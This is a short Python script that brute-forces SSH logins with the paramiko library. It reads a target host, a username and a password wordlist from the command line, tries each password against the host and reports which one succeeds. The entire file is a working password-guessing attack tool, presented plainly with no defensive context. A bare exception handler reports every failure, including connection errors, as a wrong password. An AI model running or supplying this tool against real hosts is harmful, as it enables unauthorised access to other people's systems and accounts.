#!/usr/bin/env python
import paramiko
import argparse

class ConnectSsh():

    def __init__(self):
        self.parser = argparse.ArgumentParser(prog="sss_brute_forcer", description="brute force ssh service", epilog="./ssh_brute_force host -u username -w wordlist")
        self.parser.add_argument("host", type=str, help="Enter the host")
        self.parser.add_argument("-u", "--user", type=str, help="Enter the username")
        self.parser.add_argument("-w", "--wordlist", type=str, help="Enter the wordlist")
        self.args = self.parser.parse_args()
        self.host, self.user, self.wordlist = self.args.host, self.args.user, self.args.wordlist

    def connect(self, host, user, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(host, username=user, password=password)
            print("Correct password: " + password)
        except:
            print("Wrong password: " + password)

    def start(self):
        with open(self.wordlist, "r") as file:
            for passwd in file:
                passwd = passwd.strip("\n")
                self.connect(self.host, self.user, passwd)
                #t = threading.Thread(target=self.connect, args=(self.host, self.user, passwd))
                #t.start()

connect = ConnectSsh()
connect.start()